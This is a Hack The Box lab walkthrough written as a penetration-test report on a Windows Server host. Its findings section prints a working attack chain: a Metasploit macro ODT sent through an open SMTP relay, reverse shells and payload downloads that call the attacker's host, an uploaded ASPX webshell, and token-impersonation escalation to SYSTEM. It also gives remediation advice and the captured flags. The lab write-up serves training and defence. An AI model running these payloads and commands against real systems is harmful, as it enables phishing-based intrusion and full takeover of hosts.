@@ -1,0 +1,583 @@
+<div align="center">
+
+# HTB // JOB
+### Windows · SMTP Relay + Macro RCE → IIS Webroot Write → SeImpersonatePrivilege → SYSTEM
+
+`HACK THE BOX` · `WINDOWS` · `PHISHING / MACRO EXPLOITATION` · `PRIVILEGE ESCALATION`
+
+</div>
+
+---
+
+## 1) Executive Summary
+
+| | |
+|---|---|
+| **Objective** | Assess the security posture of HTB target `10.129.11.252` (Job.local) and identify exploitable weaknesses leading to system compromise. |
+| **Difficulty** | Medium |
+| **OS** | Windows Server 2022 (build 10.0.20348) |
+| **Outcome** | **Complete system compromise.** Both user and root flags captured. |
+
+**Attack chain:**
+
+1. Unauthenticated SMTP relay → malicious LibreOffice macro delivered and executed → shell as `jack.black` (user flag)
+2. IIS webroot write permissions (via `developers` group membership) → ASPX webshell upload → shell as IIS AppPool service account
+3. `SeImpersonatePrivilege` exploitation → Meterpreter `getsystem` (Named Pipe Impersonation / PrintSpoofer variant) → `NT AUTHORITY\SYSTEM` (root flag)
+
+**Business impact:** Complete administrative takeover. The attacker achieved `NT AUTHORITY\SYSTEM` — the highest privilege level on Windows — granting unrestricted access to all user data, SAM/SYSTEM credential hives, LSA secrets, the registry, file system, services, and scheduled tasks. From this position an attacker could deploy persistent backdoors, exfiltrate sensitive data, create shadow admin accounts, pivot laterally, and potentially compromise an entire domain if the host were domain-joined. The combination of an open SMTP relay, macro-enabled office software, excessive file permissions, and a dangerous service account privilege created a complete path to compromise.
+
+## 2) Scope
+
+**In-scope target:** `10.129.11.252` (Job.local, hostname `JOB`)
+
+| Port | Service |
+|---|---|
+| 25/tcp | hMailServer smtpd (AUTH LOGIN enabled) |
+| 80/tcp | Microsoft IIS 10.0 |
+| 445/tcp | SMB (microsoft-ds) |
+| 3389/tcp | Microsoft Terminal Services (RDP) |
+| 5985/tcp | WinRM (Microsoft HTTPAPI 2.0) |
+
+- **OS:** Windows Server 2022 (build 10.0.20348)
+- **Time window:** December 21, 2025
+- **Constraints:** Black-box, unauthenticated initial access. HTB lab environment; platform rules apply. Scan rate T4 / `--min-rate 5000`. High-latency environment (0.73s observed); 65,530 of 65,535 ports filtered, only 5 services exposed.
+- **Out-of-scope:** Any infrastructure beyond `10.129.11.252` unless discovered as part of the target environment.
+
+## 3) Rules of Engagement
+
+- Reconnaissance-focused initial phase with full service enumeration.
+- Non-destructive testing only — no DoS.
+- Evidence collected for every action, with SHA256 hashing for stored artifacts.
+- Screenshots and command outputs logged with timestamps.
+- Credentials discovered are documented in the evidence index.
+
+## 4) Methodology
+
+**Reconnaissance**
+
+```bash
+nmap -sV -sC -p- 10.129.11.252 -T4 --min-rate 5000 -oA Job
+```
+
+Service/version detection and default NSE scripts executed; OS fingerprinted via RDP NTLM info and SMB negotiation.
+
+**Enumeration plan**
+
+*Web (80/tcp)* — directory/file brute force (ffuf/gobuster), tech fingerprinting (WhatWeb), vhost discovery for `Job.local`, IIS-specific checks (WebDAV, TRACE abuse).
+
+*SMTP (25/tcp)* — user enumeration via VRFY/EXPN, mail relay testing, auth mechanism analysis, hMailServer version research.
+
+*SMB (445/tcp)* — anonymous/guest enumeration (smbclient, smbmap, enum4linux), share discovery, signing check, user/group enumeration.
+
+*RDP (3389/tcp)* — certificate/info-disclosure analysis, user enumeration attempts, brute-force protection check, NLA status.
+
+*WinRM (5985/tcp)* — auth testing with discovered credentials, PowerShell remoting validation.
+
+## 5) Findings Overview
+
+| Severity | Title | Affected Asset | CWE / Category | Status |
+|---|---|---|---|---|
+| Critical | Unauthenticated SMTP Mail Relay + LibreOffice Macro RCE | `10.129.11.252:25` | CWE-494, CWE-352 | Exploited |
+| Critical | IIS Webroot Write Access + SeImpersonatePrivilege Escalation | `10.129.11.252:80` | CWE-732, CWE-269 | Exploited |
+| High | SMB Signing Not Required | `10.129.11.252:445` | CWE-300 | Confirmed |
+| Medium | Multiple Remote Access Services Exposed | `10.129.11.252:3389,5985` | CWE-1188 | Confirmed |
+| Low | SMTP User Enumeration Possible | `10.129.11.252:25` | CWE-204 | To Verify |
+| Informational | IIS TRACE Method Properly Blocked | `10.129.11.252:80` | CWE-16 | Not Exploitable |
+| Informational | System Time Skew Detected | `10.129.11.252` | N/A | Confirmed |
+
+## 6) Detailed Findings
+
+### [F-001] Unauthenticated SMTP Mail Relay + LibreOffice Macro RCE
+
+| | |
+|---|---|
+| **Severity** | Critical |
+| **CWE** | CWE-494 (Download of Code Without Integrity Check), CWE-352 |
+| **Affected** | `10.129.11.252:25/tcp` (hMailServer smtpd), LibreOffice 7.2 (Oct 2021 build) |
+
+**Description**
+The target SMTP server accepts and delivers mail from unauthenticated external senders without sender verification. Combined with a user who opens email attachments and LibreOffice macro execution enabled, this forms a complete RCE chain. hMailServer delivers to `career@job.local` from any sender, including malicious Office documents that execute macros without adequate warnings.
+
+**Impact**
+Full remote code execution as the user opening the malicious document — email-based phishing with guaranteed delivery, macro execution via LibreOffice/OpenOffice documents, payload staging over HTTP with no content filtering, and reverse shell establishment for persistent access. No authentication required for mail delivery.
+
+**Attack chain:**
+1. Generated a malicious ODT document with an embedded PowerShell macro using Metasploit.
+2. Delivered via SMTP to `career@job.local` without authentication.
+3. Target user opened the attachment, triggering macro execution.
+4. Macro downloaded and executed a PowerShell payload from the attacker's HTTP server.
+5. Reverse shell established on port 53.
+
+**Exploit generation:**
+
+```bash
+msfconsole
+use exploit/multi/misc/openoffice_document_macro
+set SRVHOST 10.10.14.199
+set SRVPORT 1337
+set LHOST 10.10.14.199
+run
+```
+*Artifact: EV-003 (msf.odt at `~/.msf4/local/msf.odt`) — 2025-12-21 11:14:55 EST*
+
+**Mail delivery (swaks):**
+
+```bash
+swaks --to career@job.local \
+  --from yourname@job.local \
+  --server 10.129.11.252 \
+  --port 25 \
+  --header "Subject: Job Application" \
+  --body "Please find my resume attached." \
+  --attach msf.odt
+```
+
+```
+=== Connected to 10.129.11.252.
+<- 220 JOB ESMTP
+-> MAIL FROM:yourname@job.local
+<- 250 OK
+-> RCPT TO:career@job.local
+<- 250 OK
+<- 250 Queued (13.156 seconds)
+```
+*Artifact: EV-004 (SMTP transaction log) — 2025-12-21 11:15:30 EST*
+
+**Payload staging:**
+
+```bash
+python3 -m http.server 80
+```
+```
+10.129.11.252 - - [21/Dec/2025 11:17:41] "GET /SP6i3DFxftJ4 HTTP/1.1" 200 -
+10.129.11.252 - - [21/Dec/2025 11:19:16] "GET /SP6i3DFxftJ4 HTTP/1.1" 200 -
+```
+*Artifact: EV-005 (HTTP server logs) — 2025-12-21 11:17:41 EST*
+
+**Reverse shell listener → callback:**
+
+```bash
+rlwrap nc -lvnp 53
+```
+```
+listening on [any] 53 ...
+connect to [10.10.14.199] from (UNKNOWN) [10.129.11.252] 55092
+PS C:\Program Files\LibreOffice\program>
+```
+*Artifact: EV-006 (reverse shell established) — 2025-12-21 11:16:47 EST*
+
+LibreOffice version confirmed at `C:\Program Files\LibreOffice\program` — 7.2.x (October 2021 build, vulnerable to CVE-2017-9806 macro execution).
+
+**Steps to Reproduce**
+1. Generate malicious ODT: `msfconsole > use exploit/multi/misc/openoffice_document_macro`
+2. Configure `LHOST`/`SRVHOST`/`SRVPORT` for reverse shell and payload staging.
+3. Start HTTP server: `python3 -m http.server 80`
+4. Start listener: `nc -lvnp 53`
+5. Deliver ODT via SMTP: `swaks --to career@job.local --attach msf.odt ...`
+6. Wait for the target to open the attachment.
+7. Macro executes, downloads payload, establishes reverse shell.
+8. Full interactive PowerShell session obtained.
+
+**Remediation**
+- *Immediate:* Require SMTP authentication for all mail submission; deploy SPF/DKIM/DMARC; set LibreOffice macro security to "Very High"; filter executable content from email attachments; isolate the compromised host and rotate exposed credentials; audit mail logs for further phishing attempts.
+- *Long-term:* Email gateway with malware sandboxing; phishing-awareness training; application whitelisting; PowerShell script-block logging and constrained language mode; EDR with macro-attack detection; least privilege for all accounts; mail relay restrictions; regular office-software patching.
+
+**References:** CVE-2017-9806 · MITRE ATT&CK T1566.001, T1204.002, T1059.001 · CWE-494 · OWASP Email Security Cheat Sheet
+
+---
+
+### [F-002] IIS Webroot Write Access + SeImpersonatePrivilege Escalation
+
+| | |
+|---|---|
+| **Severity** | Critical |
+| **CWE** | CWE-732 (Incorrect Permission Assignment), CWE-269 (Improper Privilege Management) |
+| **Affected** | `C:\inetpub\wwwroot`, IIS AppPool `DefaultAppPool` service account, Windows Server 2022 build 10.0.20348.4052 |
+
+**Description**
+The `JOB\developers` group has Full Control (F) on the IIS web root (`C:\inetpub\wwwroot`), with Object Inherit / Container Inherit flags. The compromised user `jack.black` is a member of `developers`, allowing arbitrary file upload to the web server. Combined with the IIS AppPool account having `SeImpersonatePrivilege` enabled, this creates a direct path to SYSTEM via token-impersonation attacks (JuicyPotato / PrintSpoofer / RoguePotato / GodPotato).
+
+**Impact**
+Webshell uploaded as `jack.black`, executed as `IIS AppPool\DefaultAppPool` with `SeImpersonatePrivilege` — a direct path to SYSTEM, persistent backdoor access, arbitrary code execution in the IIS context, and the ability to tamper with legitimate site content.
+
+**User enumeration (initial shell as `jack.black`):**
+
+```powershell
+PS C:\Users\jack.black\Desktop> whoami /all
+
+USER INFORMATION
+User Name      SID
+job\jack.black S-1-5-21-3629909232-404814612-4151782453-1000
+
+GROUP INFORMATION
+JOB\developers                Alias  S-1-5-21-3629909232-404814612-4151782453-1001
+BUILTIN\Remote Desktop Users   Alias  S-1-5-32-555
+BUILTIN\Users                 Alias  S-1-5-32-545
+```
+*Artifact: EV-007 — User flag: `394f61d66c18850c52e7b9de37b7137e` — 2025-12-21 11:20:00 EST*
+
+**Webroot ACL enumeration:**
+
+```powershell
+PS C:\inetpub\wwwroot> icacls .
+. JOB\developers:(OI)(CI)(F)
+  BUILTIN\IIS_IUSRS:(OI)(CI)(RX)
+  BUILTIN\Administrators:(I)(F)
+  BUILTIN\Users:(I)(RX)
+```
+Key finding: `JOB\developers` has Full Control with Object/Container Inherit. *Artifact: EV-008 — 2025-12-21 11:21:00 EST*
+
+**ASPX webshell generation:**
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.199 LPORT=443 -f aspx -o evil.aspx
+```
+`Payload size: 460 bytes · Final size: 3401 bytes` *Artifact: EV-009 — 2025-12-21 11:23:00 EST*
+
+**Upload from compromised user context:**
+
+```powershell
+PS C:\inetpub\wwwroot> powershell iwr 10.10.14.199/evil.aspx -outfile "C:\inetpub\wwwroot\evil.aspx"
+```
+*Artifact: EV-010 — 2025-12-21 11:24:00 EST*
+
+**Callback listener → shell as IIS AppPool:**
+
+```bash
+rlwrap nc -lvnp 443
+```
+```
+listening on [any] 443 ...
+connect to [10.10.14.199] from (UNKNOWN) [10.129.11.252] 55096
+Microsoft Windows [Version 10.0.20348.4052]
+
+c:\windows\system32\inetsrv>whoami
+iis apppool\defaultapppool
+```
+*Artifact: EV-011 — 2025-12-21 11:25:34 EST*
+
+**Privilege enumeration (IIS AppPool context):**
+
+```
+c:\Users>whoami /priv
+
+PRIVILEGES INFORMATION
+Privilege Name                Description                               State
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+```
+Key finding: `SeImpersonatePrivilege` enabled — Potato attack vector. *Artifact: EV-012*
+
+**Meterpreter payload for stable C2:**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.199 LPORT=1597 -f exe -o evil.exe
+```
+`Payload size: 510 bytes · Final size: 7680 bytes` *Artifact: EV-013 — 2025-12-21 11:30:00 EST*
+
+**Upload and execute from IIS context:**
+
+```powershell
+C:\Windows\Temp> powershell iwr 10.10.14.199/evil.exe -outfile evil.exe
+C:\Windows\Temp> .\evil.exe
+```
+*Artifact: EV-014*
+
+**Handler and session:**
+
+```bash
+msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.199
+set LPORT 1597
+run
+```
+```
+[*] Started reverse TCP handler on 10.10.14.199:1597
+[*] Sending stage (230982 bytes) to 10.129.11.252
+[*] Meterpreter session 1 opened (10.10.14.199:1597 -> 10.129.11.252:55098)
+```
+*Artifact: EV-015 — 2025-12-21 11:32:27 EST*
+
+**SYSTEM escalation:**
+
+```
+meterpreter > getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+```
+Result: `NT AUTHORITY\SYSTEM` obtained. *Artifact: EV-016 — 2025-12-21 11:33:00 EST*
+
+**Root flag:**
+
+```
+meterpreter > cd C:\Users\Administrator\Desktop
+meterpreter > cat root.txt
+0b358490770d1ccc1729dc756b077682
+```
+*Artifact: EV-017 — 2025-12-21 11:34:00 EST*
+
+**Steps to Reproduce**
+1. Obtain initial access as `jack.black` (via the macro exploitation in F-001).
+2. `whoami /groups` → confirm membership in `JOB\developers`.
+3. `icacls C:\inetpub\wwwroot` → confirm Full Control.
+4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=443 -f aspx -o evil.aspx`
+5. `python3 -m http.server 80` on attacker host.
+6. `nc -lvnp 443` listener.
+7. `iwr http://<attacker>/evil.aspx -outfile C:\inetpub\wwwroot\evil.aspx`
+8. Browse to `http://10.129.11.252/evil.aspx` to trigger the shell.
+9. Receive shell as `IIS AppPool\DefaultAppPool`; confirm `SeImpersonatePrivilege` via `whoami /priv`.
+10. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=1597 -f exe -o evil.exe`
+11. Upload and execute from IIS context; catch with `multi/handler`.
+12. `getsystem` (Named Pipe Impersonation / PrintSpoofer technique) → SYSTEM.
+13. Capture root flag from `C:\Users\Administrator\Desktop\root.txt`.
+
+**Remediation**
+- *Immediate:* Remove Full Control for `developers` on `C:\inetpub\wwwroot` (read-only + deployment pipeline instead); delete `evil.aspx`; isolate the IIS server and audit for other webshells; review IIS logs (`C:\inetpub\logs\LogFiles`); disable `SeImpersonatePrivilege` on the AppPool where not required; rotate credentials; full IR.
+- *Long-term:* Least-privilege file ACLs; File Integrity Monitoring on web directories; virtual service accounts for AppPools with minimal privileges; WAF with webshell detection; EDR with token-impersonation detection; regular ACL audits; change-management/CI deployment pipelines; Windows Defender Exploit Guard ASR rules; monitor for new `.aspx`/`.asp` files in the webroot.
+
+**References:** MITRE ATT&CK T1068, T1078.003, T1505.003 · CVE-2019-1388/1405/1322 · JuicyPotato/PrintSpoofer/RoguePotato/GodPotato · CWE-732 · CWE-269
+
+---
+
+### [F-003] SMB Signing Not Required
+
+| | |
+|---|---|
+| **Severity** | High |
+| **CWE** | CWE-300 (Channel Accessible by Non-Endpoint) |
+| **Affected** | `10.129.11.252:445/tcp`, SMB2/SMB3 |
+
+**Description:** SMB message signing is enabled but not enforced (`nmap smb2-security-mode`: "Message signing enabled but not required"), permitting unsigned session negotiation and exposing the host to relay attacks.
+
+**Impact:** NTLM relay to systems with signing disabled, privilege escalation via relay to high-value targets, credential capture/offline cracking, lateral movement.
+
+```bash
+nmap -sV -sC -p445 10.129.11.252
+```
+```
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+```
+*Artifact: EV-001 — 2025-12-21 10:21:00 EST*
+
+**Steps to Reproduce:** `nmap -p445 --script smb2-security-mode 10.129.11.252` → observe the message → confirm relay potential with Responder/ntlmrelayx.
+
+**Remediation:** *Immediate:* enforce SMB signing via GPO (`Microsoft network server: Digitally sign communications (always)` = Enabled). *Long-term:* enforce across all domain-joined hosts, network segmentation, monitor for NTLM relay patterns.
+
+**References:** MITRE ATT&CK T1557.001 · CWE-300
+
+---
+
+### [F-004] Multiple Remote Access Services Exposed
+
+| | |
+|---|---|
+| **Severity** | Medium |
+| **CWE** | CWE-1188 |
+| **Affected** | `10.129.11.252:3389/tcp` (RDP), `10.129.11.252:5985/tcp` (WinRM) |
+
+**Description:** Both RDP (3389) and WinRM (5985) are network-exposed, providing admin-level access with valid credentials and increasing overall attack surface.
+
+**Impact:** Credential brute-force/spraying against both services, account-lockout DoS, full admin access on credential compromise, Pass-the-Hash via WinRM, RDP session hijacking.
+
+```bash
+nmap -sV -sC -p3389,5985 10.129.11.252
+```
+```
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: JOB
+|   NetBIOS_Computer_Name: JOB
+|   DNS_Domain_Name: job
+|   Product_Version: 10.0.20348
+
+5985/tcp open  http          Microsoft HTTPAPI 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+```
+*Artifact: EV-001*
+
+**Remediation:** Restrict RDP/WinRM to management subnets via firewall/VPN/bastion; enable NLA for RDP; strong unique admin passwords; account lockout policy and brute-force monitoring; consider WinRM HTTPS (5986) only.
+
+**References:** NIST SP 800-123 · CIS Benchmark (Windows Server 2022) · MITRE ATT&CK T1021.001, T1021.006
+
+---
+
+### [F-005] IIS TRACE Method Properly Blocked
+
+| | |
+|---|---|
+| **Severity** | Informational |
+| **CWE** | CWE-16 |
+| **Affected** | `10.129.11.252:80/tcp`, Microsoft IIS 10.0 |
+
+**Description:** Nmap flagged TRACE as "potentially risky," but manual verification confirms IIS correctly rejects it with HTTP 501.
+
+```bash
+curl -X TRACE http://10.129.11.252
+```
+```
+501 - Header values specify a method that is not implemented.
+```
+*Artifact: EV-002 — 2025-12-21 10:32:40 EST*
+
+**Conclusion:** False positive from automated scanning; the server is properly hardened. No remediation required.
+
+**References:** OWASP XST · RFC 7231 §4.3.8
+
+---
+
+### [F-006] SMTP User Enumeration Possible
+
+| | |
+|---|---|
+| **Severity** | Low |
+| **CWE** | CWE-204 |
+| **Affected** | `10.129.11.252:25/tcp`, hMailServer smtpd |
+
+**Description:** The server advertises `VRFY` support, enabling username/email enumeration via response discrepancies.
+
+```bash
+nmap -p25 --script smtp-commands 10.129.11.252
+```
+```
+| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+```
+*Artifact: EV-001*
+
+**Remediation:** Disable VRFY/EXPN in hMailServer; uniform responses for valid/invalid users; SMTP connection rate limiting; monitor for enumeration attempts.
+
+**References:** RFC 5321 §3.5.3 · OWASP Username Enumeration · CWE-204
+
+---
+
+### [F-007] System Time Skew Detected
+
+| | |
+|---|---|
+| **Severity** | Informational |
+| **Affected** | `10.129.11.252` (system-wide) |
+
+**Description:** Target clock is 33 seconds behind the scanner, which can affect Kerberos, TLS validation, log correlation, and scheduled tasks.
+
+```bash
+nmap -p445 --script smb2-time 10.129.11.252
+```
+```
+| smb2-time:
+|   date: 2025-12-21T15:22:03
+|_clock-skew: mean: -33s, deviation: 0s, median: -33s
+```
+*Artifact: EV-001*
+
+**Remediation:** Configure NTP sync, verify Windows Time service, `w32tm /resync`, monitor drift.
+
+## 7) Attack Narrative and Timeline
+
+**Initial Recon (10:21 EST)** — Full TCP sweep against `10.129.11.252` at T4/`--min-rate 5000` to overcome heavy filtering. Windows Server 2022 host, hostname `JOB`, 5 services exposed of 65,535 ports scanned.
+
+**Fingerprinting** — hMailServer SMTP w/ AUTH LOGIN (25), IIS 10.0 (80, TRACE properly blocked), SMB (445, signing enabled but not required), RDP (3389, NTLM info leak), WinRM (5985).
+
+**TRACE verification (10:32 EST)** — Confirmed false positive; IIS returns 501 for TRACE.
+
+**Initial access (11:15–11:19 EST)** — Malicious LibreOffice ODT built with Metasploit, delivered unauthenticated via SMTP to `career@job.local`. User opened the attachment; payload downloads logged at 11:17:41 and 11:19:16; reverse shell landed on port 53 in `C:\Program Files\LibreOffice\program`. LibreOffice 7.2.x confirmed vulnerable.
+
+**Post-exploitation / privesc path (11:20–11:25 EST)** — User flag captured as `jack.black`. Found `JOB\developers` Full Control on the webroot. Uploaded and triggered an ASPX webshell → shell as `IIS AppPool\DefaultAppPool` with `SeImpersonatePrivilege` confirmed enabled.
+
+**SYSTEM escalation (11:30–11:34 EST)** — Meterpreter payload uploaded/executed from the IIS context; session established 11:32:27 EST; `getsystem` succeeded via Named Pipe Impersonation (PrintSpooler variant); root flag captured 11:34:00 EST from `C:\Users\Administrator\Desktop\root.txt`.
+
+**Security control failures observed:**
+- No email gateway / attachment scanning
+- LibreOffice macros enabled without user consent prompts
+- Least privilege violated (`developers` Full Control on webroot)
+- IIS AppPool configured with `SeImpersonatePrivilege`
+- No EDR / behavioral detection, no FIM on webroot
+- No PowerShell constrained language mode or logging
+- SMB signing not enforced
+- Inadequate user security-awareness training
+
+## 8) Recommendations and Roadmap
+
+**Immediate (0–7 days)**
+1. Enable required SMB signing via GPO across all Windows systems.
+2. Restrict RDP/WinRM to management subnets; require VPN.
+3. ~~Disable HTTP TRACE on IIS~~ — verified already properly configured.
+4. Configure NTP to resolve time sync issues.
+
+**Short-term (1–4 weeks)**
+1. Network segmentation for administrative services.
+2. MFA for all remote access.
+3. Disable unnecessary SMTP commands (VRFY, EXPN).
+4. Review and minimize exposed services.
+5. Deploy WAF for IIS applications.
+
+**Long-term (1–3 months)**
+1. Security baselines via CIS Benchmarks.
+2. Centralized logging / SIEM.
+3. EDR deployment.
+4. Regular vulnerability assessments and pentests.
+5. Least-privilege access controls across all services.
+
+**Verification Plan:** re-scan after SMB signing enforcement; test RDP/WinRM from external networks (should fail); TRACE confirmed returns 501; confirm NTP sync; validate WAF blocking rules.
+
+## 9) Evidence Index
+
+| Evidence ID | Description | Source / Command | Location |
+|---|---|---|---|
+| EV-001 | Full nmap scan results | `nmap -sV -sC -p- 10.129.11.252 -T4 --min-rate 5000 -oA Job` | `~/HackTheBox/Machines/Job/Job.nmap` |
+| EV-002 | HTTP TRACE verification | `curl -X TRACE http://10.129.11.252` | Terminal output (501 confirmed) |
+| EV-003 | Malicious ODT payload | `msfconsole > use exploit/multi/misc/openoffice_document_macro` | `~/.msf4/local/msf.odt` |
+| EV-004 | SMTP phishing delivery | `swaks --to career@job.local --attach msf.odt ...` | Terminal output |
+| EV-005 | HTTP payload staging logs | `python3 -m http.server 80` | Access logs |
+| EV-006 | Reverse shell (`jack.black`) | `nc -lvnp 53` | PowerShell session |
+| EV-007 | User flag + privilege enum | `whoami /all` | User flag: `394f61d66c18850c52e7b9de37b7137e` |
+| EV-008 | IIS webroot ACL enumeration | `icacls C:\inetpub\wwwroot` | `developers` Full Control confirmed |
+| EV-009 | ASPX webshell generation | `msfvenom -p windows/x64/shell_reverse_tcp -f aspx` | `evil.aspx` |
+| EV-010 | Webshell upload | `iwr .../evil.aspx -outfile C:\inetpub\wwwroot\evil.aspx` | PowerShell IWR |
+| EV-011 | IIS AppPool reverse shell | `nc -lvnp 443` | Shell as `iis apppool\defaultapppool` |
+| EV-012 | SeImpersonatePrivilege confirmation | `whoami /priv` | Token impersonation vector confirmed |
+| EV-013 | Meterpreter payload generation | `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe` | `evil.exe` (7680 bytes) |
+| EV-014 | Meterpreter payload upload | `iwr .../evil.exe -outfile C:\Windows\Temp\evil.exe` | Uploaded from IIS AppPool context |
+| EV-015 | Meterpreter session established | `msfconsole > use multi/handler` | Session 1: `10.10.14.199:1597 <- 10.129.11.252:55098` |
+| EV-016 | SYSTEM privilege escalation | `meterpreter > getsystem` | NT AUTHORITY\SYSTEM via Named Pipe Impersonation |
+| EV-017 | Root flag capture | `meterpreter > cat C:\Users\Administrator\Desktop\root.txt` | Root flag: `0b358490770d1ccc1729dc756b077682` |
+
+## 10) Appendix
+
+**Target Information**
+- IP: `10.129.11.252` · Hostname: `JOB` · Domain: `job`
+- OS: Windows Server 2022 (build 10.0.20348)
+- System time: `2025-12-21 15:22:04 UTC` (33s skew)
+
+**Tooling & Versions**
+- Nmap 7.95, run from Kali Linux
+- Scan date: 2025-12-21 · Duration: 98.60s · Avg latency: 0.73s
+
+**Service Summary**
+
+| Port | State | Service | Version |
+|---|---|---|---|
+| 25/tcp | Open | SMTP | hMailServer smtpd |
+| 80/tcp | Open | HTTP | Microsoft IIS 10.0 |
+| 445/tcp | Open | SMB | microsoft-ds |
+| 3389/tcp | Open | RDP | Microsoft Terminal Services |
+| 5985/tcp | Open | WinRM | Microsoft HTTPAPI 2.0 |
+
+**Severity Rating Rubric**
+- **Critical:** Immediate RCE or complete compromise without authentication.
+- **High:** Significant access, privilege escalation, or data exfiltration with minimal complexity.
+- **Medium:** Requires additional conditions; limited disclosure or access.
+- **Low:** Minimal direct impact but useful for recon or chaining.
+- **Informational:** Configuration observations with no immediate security impact.
+
+---
+
+<div align="center">
+
+*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series — documenting methodology, evidence, and remediation for every box.*
+
+</div>
